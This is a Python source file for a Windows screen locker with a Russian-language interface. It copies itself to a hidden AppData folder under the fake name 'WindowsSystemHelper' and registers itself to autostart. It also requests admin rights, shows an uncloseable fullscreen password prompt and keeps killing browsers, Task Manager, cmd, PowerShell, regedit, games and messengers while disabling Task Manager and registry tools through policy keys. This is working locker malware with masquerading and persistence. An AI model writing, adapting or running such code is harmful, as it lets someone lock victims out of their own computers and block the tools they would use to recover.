import os
import sys
import time
import ctypes
import psutil
import winreg
import getpass
import shutil
import threading
import tkinter as tk
from tkinter import messagebox
import RAMWORKER

class ProcessBlocker:
    def __init__(self, password):

        self.running = True
        self.password = password
        self.username = getpass.getuser()


        self.browsers = [
            "msedge.exe", "chrome.exe", "firefox.exe",
            "opera.exe", "yandex.exe", "iexplore.exe"
        ]
        self.tools = [
            "taskmgr.exe", "cmd.exe", "powershell.exe",
            "regedit.exe", "mmc.exe", "control.exe"
        ]
        self.games = [
            "roblox.exe", "minecraft.exe", "tlauncher.exe",
            "rulauncher.exe", "javaw.exe", "java.exe"
        ]
        self.other = [
            "discord.exe", "steam.exe", "epicgameslauncher.exe",
            "battle.net.exe", "telegram.exe", "viber.exe"
        ]


        self._setup_paths()
        self._install_service()
        self._init_gui()

    def _setup_paths(self):

        self.appdata = os.environ['APPDATA']
        self.hidden_dir = os.path.join(self.appdata, 'WindowsSystemHelper')
        self.hidden_exe = os.path.join(self.hidden_dir, 'system_helper.exe')
        self.log_file = os.path.join(self.hidden_dir, 'system.log')

    def _install_service(self):

        if not os.path.exists(self.hidden_dir):
            os.makedirs(self.hidden_dir, exist_ok=True)
            os.system(f'attrib +h "{self.hidden_dir}"')

        if getattr(sys, 'frozen', False):
            src = sys.executable
        else:
            src = os.path.abspath(__file__)

        if not os.path.exists(self.hidden_exe):
            shutil.copy2(src, self.hidden_exe)
            os.system(f'attrib +h "{self.hidden_exe}"')

        self._add_to_startup()

    def _add_to_startup(self):

        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(
                key, "WindowsSystemHelper", 0, winreg.REG_SZ,
                f'"{self.hidden_exe}" --hidden'
            )
            winreg.CloseKey(key)
        except Exception as e:
            self._log_error(f"Startup error: {str(e)}")

    def handle_window_close(self):
        pass
    def _init_gui(self):

        self.root = tk.Tk()
        self.root.protocol("WM_DELETE_WINDOW", self.handle_window_close)
        self.root.title("Системный контроль")
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='#1a1a1a')
        self.root.protocol("WM_DELETE_WINDOW", self._prevent_close)


        for key in ["<Alt-F4>", "<Control-Alt-Delete>", "<Control-Shift-Escape>"]:
            self.root.bind(key, lambda e: "break")

        self._create_ui()

    def _create_ui(self):

        main_frame = tk.Frame(self.root, bg='#2d2d2d', padx=40, pady=40)
        main_frame.place(relx=0.5, rely=0.5, anchor='center')


        tk.Label(
            main_frame, text="СИСТЕМНЫЙ КОНТРОЛЬ",
            font=("Arial", 24, 'bold'), fg='red', bg='#2d2d2d'
        ).pack(pady=(0, 20))


        tk.Label(
            main_frame,
            text="Доступ к системе ограничен администратором\nДля разблокировки введите пароль",
            font=("Arial", 14), fg='white', bg='#2d2d2d'
        ).pack(pady=(0, 30))


        self.pass_entry = tk.Entry(
            main_frame, font=("Arial", 16), show="*", width=25,
            bg='#3d3d3d', fg='white', insertbackground='white'
        )
        self.pass_entry.pack(pady=(0, 20))


        tk.Button(
            main_frame, text="РАЗБЛОКИРОВАТЬ",
            font=("Arial", 14, 'bold'), command=self._unlock_system,
            bg='#4b6cb7', fg='white', activebackground='#3a5a99',
            width=20
        ).pack()

    def start(self):


        if not self._is_admin():
            self._restart_as_admin()
            return


        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


        threading.Thread(target=self._process_monitor, daemon=True).start()
        threading.Thread(target=self._system_protection, daemon=True).start()


        self.root.mainloop()

    def _process_monitor(self):

        while self.running:
            try:
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        proc_name = proc.info['name'].lower()
                        if (proc_name in [p.lower() for p in self.browsers] or
                                proc_name in [p.lower() for p in self.tools] or
                                proc_name in [p.lower() for p in self.games] or
                                proc_name in [p.lower() for p in self.other]):
                            proc.kill()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
            except Exception as e:
                self._log_error(f"Process monitor: {str(e)}")

            time.sleep(0.4)

    def _system_protection(self):

        while self.running:
            try:

                self._block_registry_tools(True)


                os.system('taskkill /f /im taskmgr.exe >nul 2>&1')
                os.system('taskkill /f /im cmd.exe >nul 2>&1')

            except Exception as e:
                self._log_error(f"System protection: {str(e)}")

            time.sleep(1)

    def _unlock_system(self):

        if self.pass_entry.get() == self.password:
            try:
                RAMWORKER.write_txt_file("config.txt", "")
                self.running = False
                self._block_registry_tools(False)
                self._remove_from_startup()
                self.root.destroy()
                os._exit(0)
            except Exception as e:
                messagebox.showerror("Ошибка", f"Ошибка разблокировки: {str(e)}")
        else:
            messagebox.showerror("Ошибка", "Неверный пароль!")
            self.pass_entry.delete(0, tk.END)

    def _prevent_close(self):

        messagebox.showwarning(
            "Предупреждение",
            "Закрытие программы запрещено!\nИспользуйте кнопку разблокировки."
        )

    @staticmethod
    def _is_admin():

        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def _restart_as_admin(self):

        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit(0)
        except Exception as e:
            self._log_error(f"Admin restart failed: {str(e)}")
            messagebox.showerror("Ошибка", "Не удалось получить права администратора!")
            sys.exit(1)

    @staticmethod
    def _block_registry_tools(block):

        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                0, winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1 if block else 0)
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1 if block else 0)
            winreg.CloseKey(key)
        except Exception:
            pass

    def _remove_from_startup(self):

        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.DeleteValue(key, "WindowsSystemHelper")
            winreg.CloseKey(key)
        except Exception:
            pass

    def _log_error(self, message):
        with open(self.log_file, 'a') as f:
            f.write(f"[{time.ctime()}] {message}\n")
